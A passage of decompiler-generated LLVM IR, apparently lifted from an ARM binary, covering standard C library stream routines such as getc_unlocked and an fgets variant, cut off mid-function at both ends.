  %v2_1aef8 = add i32 %v0_1aef8, 52
  %v3_1aef8 = inttoptr i32 %v2_1aef8 to i32*
  %v4_1aef8 = load i32, i32* %v3_1aef8, align 4
  store i32 %v4_1aef8, i32* %r3.global-to-local, align 4
  %v1_1af04 = inttoptr i32 %v4_1aef8 to i32*
  %v2_1af04 = load i32, i32* %v1_1af04, align 4
  store i32 %v2_1af04, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v4_1aeb4)
  %v0_1af10 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1af10, i32* @r6, align 4
  %v2_1af14 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_1af14, i32* @r8, align 4
  store i32 80, i32* %fp.global-to-local, align 4
  %v0_1afa8.pr = load i32, i32* @r7, align 4
  %v2_1afa819 = icmp eq i32 %v0_1afa8.pr, 0
  br i1 %v2_1afa819, label %dec_label_pc_1afb0, label %dec_label_pc_1af1c

dec_label_pc_1af1c:                               ; preds = %dec_label_pc_1ae50, %dec_label_pc_1afa4
  %v0_1af28 = phi i32 [ %v3_1afa4, %dec_label_pc_1afa4 ], [ %v0_1afa8.pr, %dec_label_pc_1ae50 ]
  %v1_1af1c = inttoptr i32 %v0_1af28 to i16*
  %v2_1af1c = load i16, i16* %v1_1af1c, align 2
  %v3_1af1c = zext i16 %v2_1af1c to i32
  store i32 %v3_1af1c, i32* %r3.global-to-local, align 4
  %v1_1af20 = and i32 %v3_1af1c, 64
  %v2_1af20 = icmp eq i32 %v1_1af20, 0
  br i1 %v2_1af20, label %dec_label_pc_1afa4, label %dec_label_pc_1af28

dec_label_pc_1af28:                               ; preds = %dec_label_pc_1af1c
  %v1_1af28 = add i32 %v0_1af28, 56
  store i32 %v1_1af28, i32* @r4, align 4
  store i32 %v1_1af28, i32* %r2.global-to-local, align 4
  %v0_1af38 = load i32, i32* %sb.global-to-local, align 4
  %v1_1af38 = load i32, i32* %fp.global-to-local, align 4
  %v2_1af38 = add i32 %v1_1af38, %v0_1af38
  %v3_1af38 = inttoptr i32 %v2_1af38 to i32*
  %v4_1af38 = load i32, i32* %v3_1af38, align 4
  call void @__pseudo_branch(i32 %v4_1af38)
  %v1_1af48 = load i32, i32* @r8, align 4
  %v2_1af48 = add i32 %v1_1af48, %v0_1af38
  %v3_1af48 = inttoptr i32 %v2_1af48 to i32*
  %v4_1af48 = load i32, i32* %v3_1af48, align 4
  call void @__pseudo_branch(i32 %v4_1af48)
  %v0_1af54 = load i32, i32* @r7, align 4
  %v1_1af54 = inttoptr i32 %v0_1af54 to i16*
  %v2_1af54 = load i16, i16* %v1_1af54, align 2
  %v3_1af54 = zext i16 %v2_1af54 to i32
  store i32 %stack_var_-60.1.in, i32* %r2.global-to-local, align 4
  %v2_1af5c = or i32 %v3_1af54, %stack_var_-60.1.in
  %v1_1af60 = xor i32 %v2_1af5c, 320
  store i32 %v1_1af60, i32* %r3.global-to-local, align 4
  %v1_1af64 = and i32 %v1_1af60, 832
  %v2_1af64 = icmp eq i32 %v1_1af64, 0
  br i1 %v2_1af64, label %dec_label_pc_1af6c, label %bb38

dec_label_pc_1af6c:                               ; preds = %dec_label_pc_1af28
  store i32 %v0_1af54, i32* @r0, align 4
  %v0_1af70 = call i32 @__stdio_wcommit()
  %v2_1af74 = icmp eq i32 %v0_1af70, 0
  br i1 %v2_1af74, label %.thread7, label %.thread8

.thread7:                                         ; preds = %dec_label_pc_1af6c
  %v1_1af78 = load i32, i32* @r7, align 4
  %v2_1af78 = inttoptr i32 %v1_1af78 to i16*
  %v3_1af78 = load i16, i16* %v2_1af78, align 2
  %v4_1af78 = zext i16 %v3_1af78 to i32
  store i32 %v4_1af78, i32* %r3.global-to-local, align 4
  %v2_1af7c = add i32 %v1_1af78, 8
  %v3_1af7c = inttoptr i32 %v2_1af7c to i32*
  %v4_1af7c = load i32, i32* %v3_1af7c, align 4
  store i32 %v4_1af7c, i32* %r2.global-to-local, align 4
  %v2_1af80 = and i32 %v4_1af78, 65471
  store i32 %v2_1af80, i32* %r3.global-to-local, align 4
  %v3_1af84 = add i32 %v1_1af78, 28
  %v4_1af84 = inttoptr i32 %v3_1af84 to i32*
  store i32 %v4_1af7c, i32* %v4_1af84, align 4
  %v1_1af88 = load i32, i32* %r3.global-to-local, align 4
  %v2_1af88 = trunc i32 %v1_1af88 to i16
  %v3_1af88 = load i32, i32* @r7, align 4
  %v4_1af88 = inttoptr i32 %v3_1af88 to i16*
  store i16 %v2_1af88, i16* %v4_1af88, align 2
  br label %bb38

.thread8:                                         ; preds = %dec_label_pc_1af6c
  store i32 -1, i32* @r6, align 4
  br label %bb38

bb38:                                             ; preds = %.thread7, %dec_label_pc_1af28, %.thread8
  %v0_1af98 = load i32, i32* %sb.global-to-local, align 4
  %v1_1af98 = load i32, i32* %sl.global-to-local, align 4
  %v2_1af98 = add i32 %v1_1af98, %v0_1af98
  %v3_1af98 = inttoptr i32 %v2_1af98 to i32*
  %v4_1af98 = load i32, i32* %v3_1af98, align 4
  call void @__pseudo_branch(i32 %v4_1af98)
  %v0_1afa4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1afa4

dec_label_pc_1afa4:                               ; preds = %dec_label_pc_1af1c, %bb38
  %v0_1afa4 = phi i32 [ %v0_1af28, %dec_label_pc_1af1c ], [ %v0_1afa4.pre, %bb38 ]
  %v1_1afa4 = add i32 %v0_1afa4, 32
  %v2_1afa4 = inttoptr i32 %v1_1afa4 to i32*
  %v3_1afa4 = load i32, i32* %v2_1afa4, align 4
  store i32 %v3_1afa4, i32* @r7, align 4
  %v2_1afa8 = icmp eq i32 %v3_1afa4, 0
  br i1 %v2_1afa8, label %dec_label_pc_1afb0, label %dec_label_pc_1af1c

dec_label_pc_1afb0:                               ; preds = %dec_label_pc_1afa4, %dec_label_pc_1ae50
  %v0_1afb0 = call i32 @_stdio_openlist_dec_use()
  %v0_1afec.pre = load i32, i32* @r6, align 4
  br label %bb40

dec_label_pc_1afb8:                               ; preds = %dec_label_pc_1ae40
  %v2_1afb8 = load i16, i16* %arg1, align 2
  %v3_1afb8 = zext i16 %v2_1afb8 to i32
  %v1_1afbc = and i32 %v3_1afb8, 64
  store i32 %v1_1afbc, i32* %r3.global-to-local, align 4
  %v2_1afbc = icmp eq i32 %v1_1afbc, 0
  br i1 %v2_1afbc, label %bb39, label %dec_label_pc_1afc8

bb39:                                             ; preds = %dec_label_pc_1afb8
  br label %bb40

dec_label_pc_1afc8:                               ; preds = %dec_label_pc_1afb8
  %v0_1afc8 = call i32 @__stdio_wcommit()
  %v2_1afcc = icmp eq i32 %v0_1afc8, 0
  br i1 %v2_1afcc, label %.thread15, label %.thread17

.thread17:                                        ; preds = %dec_label_pc_1afc8
  br label %bb40

.thread15:                                        ; preds = %dec_label_pc_1afc8
  %v1_1afd0 = load i32, i32* %fp.global-to-local, align 4
  %v2_1afd0 = inttoptr i32 %v1_1afd0 to i16*
  %v3_1afd0 = load i16, i16* %v2_1afd0, align 2
  %v4_1afd0 = zext i16 %v3_1afd0 to i32
  store i32 %v4_1afd0, i32* %r3.global-to-local, align 4
  %v2_1afd4 = add i32 %v1_1afd0, 8
  %v3_1afd4 = inttoptr i32 %v2_1afd4 to i32*
  %v4_1afd4 = load i32, i32* %v3_1afd4, align 4
  store i32 %v4_1afd4, i32* %r2.global-to-local, align 4
  %v2_1afd8 = and i32 %v4_1afd0, 65471
  store i32 %v2_1afd8, i32* %r3.global-to-local, align 4
  %v2_1afdc = trunc i32 %v2_1afd8 to i16
  store i16 %v2_1afdc, i16* %v2_1afd0, align 2
  %v1_1afe0 = load i32, i32* %r2.global-to-local, align 4
  %v2_1afe0 = load i32, i32* %fp.global-to-local, align 4
  %v3_1afe0 = add i32 %v2_1afe0, 28
  %v4_1afe0 = inttoptr i32 %v3_1afe0 to i32*
  store i32 %v1_1afe0, i32* %v4_1afe0, align 4
  br label %bb40

bb40:                                             ; preds = %bb39, %.thread17, %dec_label_pc_1afb0, %.thread15
  %v0_1afec = phi i32 [ -1, %.thread17 ], [ 0, %bb39 ], [ %v0_1afec.pre, %dec_label_pc_1afb0 ], [ 0, %.thread15 ]
  ret i32 %v0_1afec

; uselistorder directives
  uselistorder i32 %v3_1afa4, { 1, 2, 0 }
  uselistorder i32 %v0_1ae94, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 120) to i32*), { 1, 2, 0 }
  uselistorder i32 120, { 1, 3, 4, 5, 6, 0, 10, 9, 2, 7, 8 }
  uselistorder label %bb40, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1afa4, { 1, 0 }
  uselistorder label %bb38, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1af1c, { 1, 0 }
  uselistorder label %dec_label_pc_1ae50, { 1, 0 }
}

define i32 @function_1b000(i32 %arg1) local_unnamed_addr {
dec_label_pc_1b000:
  %v0_1b000 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1b000, label %bb, label %.thread6

bb:                                               ; preds = %dec_label_pc_1b000
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1b000, %bb
  %v5_1b01c = phi i32 [ %arg1, %dec_label_pc_1b000 ], [ 0, %bb ]
  ret i32 %v5_1b01c

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_1b020 = load i32, i32* @r4, align 4
  store i32 %v3_1b020, i32* %stack_var_-12, align 4
  %v6_1b020 = load i32, i32* @r5, align 4
  %v9_1b020 = load i32, i32* @lr, align 4
  %v0_1b024 = load i32, i32* @r0, align 4
  %v1_1b024 = add i32 %v0_1b024, 16
  %v2_1b024 = inttoptr i32 %v1_1b024 to i32*
  %v3_1b024 = load i32, i32* %v2_1b024, align 4
  store i32 %v3_1b024, i32* %r2.global-to-local, align 4
  %v1_1b028 = add i32 %v0_1b024, 24
  %v2_1b028 = inttoptr i32 %v1_1b028 to i32*
  %v3_1b028 = load i32, i32* %v2_1b028, align 4
  %v3_1b02c = icmp ult i32 %v3_1b024, %v3_1b028
  store i32 %v0_1b024, i32* @r4, align 4
  br i1 %v3_1b02c, label %bb, label %dec_label_pc_1b04c

bb:                                               ; preds = %entry
  %v2_1b038 = inttoptr i32 %v3_1b024 to i8*
  %v3_1b038 = load i8, i8* %v2_1b038, align 1
  %v4_1b038 = zext i8 %v3_1b038 to i32
  store i32 %v4_1b038, i32* %r0.global-to-local, align 4
  %v6_1b038 = add i32 %v3_1b024, 1
  store i32 %v6_1b038, i32* %r2.global-to-local, align 4
  store i32 %v6_1b038, i32* %v2_1b024, align 4
  br label %dec_label_pc_1b138

dec_label_pc_1b04c:                               ; preds = %entry
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @r5, align 4
  %v1_1b04c = inttoptr i32 %v0_1b024 to i16*
  %v2_1b04c = load i16, i16* %v1_1b04c, align 2
  %v3_1b04c = zext i16 %v2_1b04c to i32
  %v1_1b050 = and i32 %v3_1b04c, 131
  %tmp25 = icmp ugt i32 %v1_1b050, 128
  br i1 %tmp25, label %dec_label_pc_1b06c, label %dec_label_pc_1b05c

dec_label_pc_1b05c:                               ; preds = %dec_label_pc_1b04c
  store i32 128, i32* @r1, align 4
  %v0_1b060 = call i32 @__stdio_trans2r_o()
  store i32 %v0_1b060, i32* %r0.global-to-local, align 4
  %v2_1b064 = icmp eq i32 %v0_1b060, 0
  br i1 %v2_1b064, label %dec_label_pc_1b05c.dec_label_pc_1b06c_crit_edge, label %dec_label_pc_1b134

dec_label_pc_1b05c.dec_label_pc_1b06c_crit_edge:  ; preds = %dec_label_pc_1b05c
  %v0_1b06c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1b06c

dec_label_pc_1b06c:                               ; preds = %dec_label_pc_1b05c.dec_label_pc_1b06c_crit_edge, %dec_label_pc_1b04c
  %v2_1b0ac = phi i32 [ %v0_1b06c.pre, %dec_label_pc_1b05c.dec_label_pc_1b06c_crit_edge ], [ %v0_1b024, %dec_label_pc_1b04c ]
  %v1_1b06c = inttoptr i32 %v2_1b0ac to i16*
  %v2_1b06c = load i16, i16* %v1_1b06c, align 2
  %v3_1b06c = zext i16 %v2_1b06c to i32
  store i32 %v3_1b06c, i32* %r2.global-to-local, align 4
  %v1_1b070 = and i32 %v3_1b06c, 2
  %v2_1b070 = icmp eq i32 %v1_1b070, 0
  br i1 %v2_1b070, label %dec_label_pc_1b09c, label %dec_label_pc_1b078

dec_label_pc_1b078:                               ; preds = %dec_label_pc_1b06c
  %tmp26 = urem i16 %v2_1b06c, 2
  %v1_1b078 = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_1b078
  %v4_1b07c = and i32 %tmp22, 4
  %v5_1b07c = add i32 %v4_1b07c, %v2_1b0ac
  %v1_1b080 = add i32 %v5_1b07c, 36
  %v2_1b080 = inttoptr i32 %v1_1b080 to i8*
  %v3_1b080 = load i8, i8* %v2_1b080, align 1
  %v4_1b080 = zext i8 %v3_1b080 to i32
  %v1_1b084 = add nsw i32 %v3_1b06c, -1
  store i32 %v1_1b084, i32* %r2.global-to-local, align 4
  store i32 %v4_1b080, i32* %r0.global-to-local, align 4
  %v2_1b090 = add i32 %v2_1b0ac, 40
  %v3_1b090 = inttoptr i32 %v2_1b090 to i32*
  store i32 0, i32* %v3_1b090, align 4
  %v0_1b094 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b094 = trunc i32 %v0_1b094 to i16
  %v2_1b094 = load i32, i32* @r4, align 4
  %v3_1b094 = inttoptr i32 %v2_1b094 to i16*
  store i16 %v1_1b094, i16* %v3_1b094, align 2
  br label %dec_label_pc_1b138

dec_label_pc_1b09c:                               ; preds = %dec_label_pc_1b06c
  %v1_1b09c = add i32 %v2_1b0ac, 16
  %v1_1b0a0 = inttoptr i32 %v1_1b09c to i32*
  %v2_1b0a0 = load i32, i32* %v1_1b0a0, align 4
  %v3_1b0a0 = add i32 %v2_1b0ac, 20
  %v4_1b0a0 = inttoptr i32 %v3_1b0a0 to i32*
  %v5_1b0a0 = load i32, i32* %v4_1b0a0, align 4
  %v9_1b0a4 = icmp eq i32 %v5_1b0a0, %v2_1b0a0
  br i1 %v9_1b0a4, label %dec_label_pc_1b0b4, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1b09c
  %v2_1b0a8 = inttoptr i32 %v2_1b0a0 to i8*
  %v3_1b0a8 = load i8, i8* %v2_1b0a8, align 1
  %v4_1b0a8 = zext i8 %v3_1b0a8 to i32
  store i32 %v4_1b0a8, i32* %r0.global-to-local, align 4
  %v6_1b0a8 = add i32 %v2_1b0a0, 1
  store i32 %v6_1b0a8, i32* %v1_1b0a0, align 4
  br label %dec_label_pc_1b138

dec_label_pc_1b0b4:                               ; preds = %dec_label_pc_1b09c
  %v1_1b0b4 = add i32 %v2_1b0ac, 4
  %v2_1b0b4 = inttoptr i32 %v1_1b0b4 to i32*
  %v3_1b0b4 = load i32, i32* %v2_1b0b4, align 4
  %v7_1b0b8 = icmp eq i32 %v3_1b0b4, -2
  br i1 %v7_1b0b8, label %.thread7, label %dec_label_pc_1b0cc

.thread7:                                         ; preds = %dec_label_pc_1b0b4
  %v2_1b0bc = or i16 %v2_1b06c, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_1b0bc, i16* %v1_1b06c, align 2
  br label %dec_label_pc_1b138

dec_label_pc_1b0cc:                               ; preds = %dec_label_pc_1b0b4
  %v1_1b0cc = and i32 %v3_1b06c, 768
  %v2_1b0cc = icmp eq i32 %v1_1b0cc, 0
  br i1 %v2_1b0cc, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_1b0cc
  %v1_1b0d4 = load i32, i32* @r5, align 4
  %v3_1b0d4 = add i32 %v1_1b0d4, 52
  %v4_1b0d4 = inttoptr i32 %v3_1b0d4 to i32*
  %v5_1b0d4 = load i32, i32* %v4_1b0d4, align 4
  store i32 %v5_1b0d4, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_1b0cc, %bb23
  %v1_1b0d8 = xor i1 %v2_1b0cc, true
  call void @__pseudo_cond_branch(i1 %v1_1b0d8, i32 ptrtoint (i32* @global_var_1ae14.1123 to i32))
  %v0_1b0dc = load i32, i32* @r4, align 4
  %v1_1b0dc = add i32 %v0_1b0dc, 8
  store i32 %v1_1b0dc, i32* %r2.global-to-local, align 4
  %v1_1b0e0 = inttoptr i32 %v1_1b0dc to i32*
  %v2_1b0e0 = load i32, i32* %v1_1b0e0, align 4
  store i32 %v2_1b0e0, i32* %r2.global-to-local, align 4
  %v3_1b0e0 = add i32 %v0_1b0dc, 12
  %v4_1b0e0 = inttoptr i32 %v3_1b0e0 to i32*
  %v5_1b0e0 = load i32, i32* %v4_1b0e0, align 4
  %v9_1b0e4 = icmp eq i32 %v5_1b0e0, %v2_1b0e0
  br i1 %v9_1b0e4, label %dec_label_pc_1b118, label %dec_label_pc_1b0ec

dec_label_pc_1b0ec:                               ; preds = %.thread9
  %v2_1b0ec = add i32 %v0_1b0dc, 24
  %v3_1b0ec = inttoptr i32 %v2_1b0ec to i32*
  store i32 %v2_1b0e0, i32* %v3_1b0ec, align 4
  %v0_1b0f0 = load i32, i32* @r4, align 4
  store i32 %v0_1b0f0, i32* %r0.global-to-local, align 4
  %v2_1b0f4 = call i32 @__stdio_rfill(i32 %v0_1b0f0)
  store i32 %v2_1b0f4, i32* %r0.global-to-local, align 4
  %v2_1b0f8 = icmp eq i32 %v2_1b0f4, 0
  br i1 %v2_1b0f8, label %dec_label_pc_1b134, label %dec_label_pc_1b100

dec_label_pc_1b100:                               ; preds = %dec_label_pc_1b0ec
  %v0_1b100 = load i32, i32* @r4, align 4
  %v1_1b100 = add i32 %v0_1b100, 20
  %v2_1b100 = inttoptr i32 %v1_1b100 to i32*
  %v3_1b100 = load i32, i32* %v2_1b100, align 4
  %v2_1b104 = add i32 %v0_1b100, 24
  %v3_1b104 = inttoptr i32 %v2_1b104 to i32*
  store i32 %v3_1b100, i32* %v3_1b104, align 4
  %v0_1b108 = load i32, i32* @r4, align 4
  %v1_1b108 = add i32 %v0_1b108, 16
  %v2_1b108 = inttoptr i32 %v1_1b108 to i32*
  %v3_1b108 = load i32, i32* %v2_1b108, align 4
  %v1_1b10c = inttoptr i32 %v3_1b108 to i8*
  %v2_1b10c = load i8, i8* %v1_1b10c, align 1
  %v3_1b10c = zext i8 %v2_1b10c to i32
  store i32 %v3_1b10c, i32* %r0.global-to-local, align 4
  %v5_1b10c = add i32 %v3_1b108, 1
  store i32 %v5_1b10c, i32* %v2_1b108, align 4
  br label %dec_label_pc_1b138

dec_label_pc_1b118:                               ; preds = %.thread9
  %v1_1b118 = inttoptr i32 %v0_1b0dc to i16*
  store i32 %v0_1b0dc, i32* %r0.global-to-local, align 4
  %v2_1b11c = ptrtoint i8* %stack_var_-17 to i32
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_1b124 = call i32 @__stdio_READ(i16* %v1_1b118, i32 %v2_1b11c, i32 1)
  store i32 %v5_1b124, i32* %r0.global-to-local, align 4
  %v2_1b128 = icmp eq i32 %v5_1b124, 0
  br i1 %v2_1b128, label %dec_label_pc_1b134, label %bb24

bb24:                                             ; preds = %dec_label_pc_1b118
  %v4_1b12c = load i8, i8* %stack_var_-17, align 1
  %v5_1b12c = sext i8 %v4_1b12c to i32
  store i32 %v5_1b12c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b138

dec_label_pc_1b134:                               ; preds = %dec_label_pc_1b118, %dec_label_pc_1b05c, %dec_label_pc_1b0ec
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b138

dec_label_pc_1b138:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_1b100, %dec_label_pc_1b078, %dec_label_pc_1b134
  %v2_1b13c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1b13c, i32* @r4, align 4
  store i32 %v6_1b020, i32* @r5, align 4
  store i32 %v9_1b020, i32* @lr, align 4
  %v1_1b140 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1b140

; uselistorder directives
  uselistorder i32 %v2_1b0a0, { 1, 0, 2 }
  uselistorder i32 %v2_1b0ac, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_1b024, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_1b138, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_1b134, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v6_1b14c = load i32, i32* @r5, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1b150 = icmp eq i32 %arg2, 0
  store i1 %v2_1b150, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_1b1d8, label %dec_label_pc_1b1c0.preheader

dec_label_pc_1b1c0.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_1b1c02 = add i32 %arg2, -1
  store i32 %v1_1b1c02, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_1b1c08 = icmp eq i32 %arg2, 1
  store i1 %v7_1b1c08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1b1c08, label %dec_label_pc_1b1c8, label %dec_label_pc_1b16c

dec_label_pc_1b16c:                               ; preds = %dec_label_pc_1b1c0.preheader, %dec_label_pc_1b1c0.backedge.dec_label_pc_1b16c_crit_edge
  %v0_1b190 = phi i32 [ %v0_1b16c.pre, %dec_label_pc_1b1c0.backedge.dec_label_pc_1b16c_crit_edge ], [ %arg3, %dec_label_pc_1b1c0.preheader ]
  %v1_1b16c = add i32 %v0_1b190, 16
  %v2_1b16c = inttoptr i32 %v1_1b16c to i32*
  %v3_1b16c = load i32, i32* %v2_1b16c, align 4
  store i32 %v3_1b16c, i32* %r2.global-to-local, align 4
  %v1_1b170 = add i32 %v0_1b190, 24
  %v2_1b170 = inttoptr i32 %v1_1b170 to i32*
  %v3_1b170 = load i32, i32* %v2_1b170, align 4
  store i32 %v3_1b170, i32* %r3.global-to-local, align 4
  %v3_1b174 = icmp uge i32 %v3_1b16c, %v3_1b170
  store i1 %v3_1b174, i1* %cpsr_c.global-to-local, align 1
  %v9_1b174 = icmp eq i32 %v3_1b16c, %v3_1b170
  store i1 %v9_1b174, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1b174, label %dec_label_pc_1b190, label %dec_label_pc_1b17c

dec_label_pc_1b17c:                               ; preds = %dec_label_pc_1b16c
  %v1_1b17c = inttoptr i32 %v3_1b16c to i8*
  %v2_1b17c = load i8, i8* %v1_1b17c, align 1
  %v3_1b17c = zext i8 %v2_1b17c to i32
  store i32 %v3_1b17c, i32* %r3.global-to-local, align 4
  %v5_1b17c = add i32 %v3_1b16c, 1
  store i32 %v5_1b17c, i32* %r2.global-to-local, align 4
  %v2_1b180 = load i32, i32* @r5, align 4
  %v3_1b180 = inttoptr i32 %v2_1b180 to i8*
  store i8 %v2_1b17c, i8* %v3_1b180, align 1
  %v4_1b180 = load i32, i32* @r5, align 4
  %v5_1b180 = add i32 %v4_1b180, 1
  store i32 %v5_1b180, i32* @r5, align 4
  %v0_1b184 = load i32, i32* %r3.global-to-local, align 4
  %v2_1b184 = icmp ugt i32 %v0_1b184, 9
  store i1 %v2_1b184, i1* %cpsr_c.global-to-local, align 1
  %v7_1b184 = icmp eq i32 %v0_1b184, 10
  store i1 %v7_1b184, i1* %cpsr_z.global-to-local, align 1
  %v0_1b188 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b188 = load i32, i32* @r4, align 4
  %v2_1b188 = add i32 %v1_1b188, 16
  %v3_1b188 = inttoptr i32 %v2_1b188 to i32*
  store i32 %v0_1b188, i32* %v3_1b188, align 4
  br i1 %v7_1b184, label %dec_label_pc_1b1c8, label %dec_label_pc_1b1c0.backedge

dec_label_pc_1b190:                               ; preds = %dec_label_pc_1b16c
  %v1_1b190 = inttoptr i32 %v0_1b190 to i16*
  %v3_1b194 = call i32 @getc_unlocked(i16* %v1_1b190)
  %v3_1b198 = icmp eq i32 %v3_1b194, -1
  store i1 %v3_1b198, i1* %cpsr_c.global-to-local, align 1
  %v8_1b198 = icmp eq i32 %v3_1b194, -1
  store i1 %v8_1b198, i1* %cpsr_z.global-to-local, align 1
  %v1_1b19c = urem i32 %v3_1b194, 256
  store i32 %v1_1b19c, i32* %r3.global-to-local, align 4
  br i1 %v3_1b198, label %dec_label_pc_1b1a4, label %dec_label_pc_1b1bc

dec_label_pc_1b1a4:                               ; preds = %dec_label_pc_1b190
  %v0_1b1a4 = load i32, i32* @r4, align 4
  %v1_1b1a4 = inttoptr i32 %v0_1b1a4 to i16*
  %v2_1b1a4 = load i16, i16* %v1_1b1a4, align 2
  %v3_1b1a4 = zext i16 %v2_1b1a4 to i32
  store i32 %v3_1b1a4, i32* %r3.global-to-local, align 4
  %v1_1b1a8 = and i32 %v3_1b1a4, 8
  %v2_1b1a8 = icmp eq i32 %v1_1b1a8, 0
  store i1 %v2_1b1a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b1a8, label %dec_label_pc_1b1c8, label %dec_label_pc_1b1d8

dec_label_pc_1b1bc:                               ; preds = %dec_label_pc_1b190
  %v1_1b1b4 = trunc i32 %v3_1b194 to i8
  %v2_1b1b4 = load i32, i32* @r5, align 4
  %v3_1b1b4 = inttoptr i32 %v2_1b1b4 to i8*
  store i8 %v1_1b1b4, i8* %v3_1b1b4, align 1
  %v4_1b1b4 = load i32, i32* @r5, align 4
  %v5_1b1b4 = add i32 %v4_1b1b4, 1
  store i32 %v5_1b1b4, i32* @r5, align 4
  %v0_1b1b8 = load i32, i32* %r3.global-to-local, align 4
  %v2_1b1b8 = icmp ugt i32 %v0_1b1b8, 9
  store i1 %v2_1b1b8, i1* %cpsr_c.global-to-local, align 1
  %v7_1b1b8 = icmp eq i32 %v0_1b1b8, 10
  store i1 %v7_1b1b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1b1b8, label %dec_label_pc_1b1c8, label %dec_label_pc_1b1c0.backedge

dec_label_pc_1b1c0.backedge:                      ; preds = %dec_label_pc_1b1bc, %dec_label_pc_1b17c
  %v0_1b1c0 = load i32, i32* %r6.global-to-local, align 4
  %v1_1b1c0 = add i32 %v0_1b1c0, -1
  store i32 %v1_1b1c0, i32* %r6.global-to-local, align 4
  %v2_1b1c0 = icmp ne i32 %v0_1b1c0, 0
  store i1 %v2_1b1c0, i1* %cpsr_c.global-to-local, align 1
  %v7_1b1c0 = icmp eq i32 %v0_1b1c0, 1
  store i1 %v7_1b1c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1b1c0, label %dec_label_pc_1b1c8, label %dec_label_pc_1b1c0.backedge.dec_label_pc_1b16c_crit_edge

dec_label_pc_1b1c0.backedge.dec_label_pc_1b16c_crit_edge: ; preds = %dec_label_pc_1b1c0.backedge
  %v0_1b16c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1b16c

dec_label_pc_1b1c8:                               ; preds = %dec_label_pc_1b1bc, %dec_label_pc_1b1c0.backedge, %dec_label_pc_1b17c, %dec_label_pc_1b1c0.preheader, %dec_label_pc_1b1a4
  %v0_1b1c8 = load i32, i32* @r5, align 4
  %v1_1b1c8 = load i32, i32* @r7, align 4
  %v3_1b1c8 = icmp uge i32 %v0_1b1c8, %v1_1b1c8
  store i1 %v3_1b1c8, i1* %cpsr_c.global-to-local, align 1
  %v9_1b1c8 = icmp eq i32 %v0_1b1c8, %v1_1b1c8
  store i1 %v9_1b1c8, i1* %cpsr_z.global-to-local, align 1
  %v2_1b1cc = xor i1 %v9_1b1c8, true
  %v3_1b1cc = and i1 %v3_1b1c8, %v2_1b1cc
  br i1 %v3_1b1cc, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_1b1c8
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_1b1d0 = inttoptr i32 %v0_1b1c8 to i8*
  store i8 0, i8* %v7_1b1d0, align 1
  %v0_1b1d4.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_1b1d4.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

